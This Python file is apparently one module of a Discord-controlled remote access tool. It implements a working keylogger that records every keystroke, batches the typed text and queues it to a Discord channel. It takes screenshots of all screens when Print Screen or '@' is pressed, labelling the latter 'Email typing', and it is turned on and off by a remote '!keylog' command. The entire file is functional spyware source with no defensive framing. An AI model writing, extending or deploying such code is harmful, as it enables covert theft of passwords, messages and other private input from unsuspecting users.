"""
commands/keylogger.py - keylogger state, background listener, and !keylog command.
"""

import json
import os
import threading

import discord
from discord.ext import commands
from PIL import ImageGrab
from pynput.keyboard import Key, Listener

from config import TEMP_DIR
from utils import (
    channel_ids,
    current_time,
    generic_command_error,
    in_correct_channel,
    is_authorized,
    log_message,
    wrong_channel,
)

# ── State ──────────────────────────────────────────────────────────────────
messages_to_send: list = []  # consumed by utils.send_messages()
keylogger_active = False
keylogger_thread = None
keylogger_listener = None
status_file = os.path.join(TEMP_DIR, "keylogger_status.json")

_CTRL_CODES = {
    "Key.ctrl_l": "CTRL_L",
    "Key.ctrl_r": "CTRL_R",
    "Key.alt_l": "ALT_L",
    "Key.alt_r": "ALT_R",
}
_KEYCODES = {
    Key.space: " ",
    Key.shift: " *`SHIFT`*",
    Key.tab: " *`TAB`*",
    Key.backspace: " *`<`*",
    Key.esc: " *`ESC`*",
    Key.caps_lock: " *`CAPS LOCK`*",
    **{getattr(Key, f"f{n}"): f" *`F{n}`*" for n in range(1, 13)},
}
_IGNORED_KEYS = {
    Key.ctrl_l,
    Key.alt_gr,
    Key.left,
    Key.right,
    Key.up,
    Key.down,
    Key.delete,
    Key.alt_l,
    Key.shift_r,
}

text_buffer = ""


# ── Persistence helpers ────────────────────────────────────────────────────
def save_keylogger_status():
    with open(status_file, "w") as f:
        json.dump({"keylogger_active": keylogger_active}, f)


def load_keylogger_status():
    global keylogger_active
    if os.path.exists(status_file):
        with open(status_file, "r") as f:
            keylogger_active = json.load(f).get("keylogger_active", False)


# ── Listener callbacks ─────────────────────────────────────────────────────
def on_press(key):
    global text_buffer
    if not keylogger_active:
        return

    raw = str(key)
    processed = raw[1:-1] if raw.startswith("'") and raw.endswith("'") else key

    if str(processed) in _CTRL_CODES:
        processed = f" `{_CTRL_CODES[str(processed)]}`"

    if processed in _IGNORED_KEYS:
        return

    processed = _KEYCODES.get(processed, processed)

    if processed == Key.enter:
        messages_to_send.append(
            (channel_ids["keylogger_channel"], text_buffer + " *`ENTER`*")
        )
        text_buffer = ""
        return

    if processed == Key.print_screen or processed == "@":
        label = " *`Print Screen`*" if processed == Key.print_screen else "@"
        ImageGrab.grab(all_screens=True).save("ss.png")
        # append a simple text note; embed sending not supported in this queue
        messages_to_send.append(
            (
                channel_ids["keylogger_channel"],
                current_time()
                + (
                    " `[Print Screen pressed]`"
                    if processed == Key.print_screen
                    else " `[Email typing]`"
                ),
            )
        )
        processed = label

    text_buffer += str(processed)
    if len(text_buffer) > 1975:
        messages_to_send.append((channel_ids["keylogger_channel"], text_buffer))
        text_buffer = ""

    print(f"Key pressed: {processed}")


# ── Start / stop ───────────────────────────────────────────────────────────
def start_keylogger():
    global keylogger_active, keylogger_listener
    keylogger_active = True
    save_keylogger_status()
    with Listener(on_press=on_press) as listener:
        keylogger_listener = listener
        listener.join()
    keylogger_listener = None


def stop_keylogger():
    global keylogger_active, keylogger_listener
    keylogger_active = False
    save_keylogger_status()
    if keylogger_listener is not None:
        keylogger_listener.stop()


# ── Cog ────────────────────────────────────────────────────────────────────
class KeyloggerCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.check(is_authorized)
    async def keylog(self, ctx, action=None):
        global keylogger_thread
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return

        if action == "on":
            if keylogger_active:
                await log_message(
                    ctx, "🔴 **Keylogger is already active.**", duration=10
                )
            else:
                keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
                keylogger_thread.start()
                await log_message(ctx, "🟢 **Keylogger has been activated.**")
                print("Keylogger activated.")
        elif action == "off":
            if not keylogger_active:
                await log_message(
                    ctx, "🔴 **Keylogger is already deactivated.**", duration=10
                )
            else:
                stop_keylogger()
                await log_message(ctx, "🔴 **Keylogger has been deactivated.**")
                print("Keylogger deactivated.")
        else:
            await log_message(
                ctx,
                "❌ **Invalid action. Use `!keylog on` or `!keylog off`.**",
                duration=10,
            )

    @keylog.error
    async def keylog_error(self, ctx, error):
        await generic_command_error(ctx, error)


async def setup(bot):
    await bot.add_cog(KeyloggerCommands(bot))
